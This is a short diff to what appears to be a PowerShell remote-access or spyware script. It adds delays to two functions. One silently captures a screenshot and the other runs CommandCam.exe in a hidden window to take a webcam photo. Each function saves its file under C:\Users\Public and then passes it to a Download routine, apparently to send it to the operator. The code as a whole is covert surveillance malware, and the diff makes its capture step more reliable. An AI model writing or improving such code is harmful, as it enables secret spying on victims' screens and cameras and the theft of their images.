@@ -117,6 +117,7 @@ function Screenshot {
     }
     $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1600, 900)
     Screenshot $bounds "C:\Users\Public\screenshot.jpg"
+    Start-Sleep -Seconds 5
     Download "C:\Users\Public\screenshot.jpg"
 }
 
@@ -150,7 +151,8 @@ function Webcam {
   $outpath = "C:\Users\Public\CommandCam.exe"
 
   $args = "/filename C:\Users\Public\image.jpg"
-  Start-Process $outpath -ArgumentList $args -WindowStyle Hidden  
+  Start-Process $outpath -ArgumentList $args -WindowStyle Hidden
+  Start-Sleep -Seconds 5
   Download "C:\Users\Public\image.jpg"
 }
 
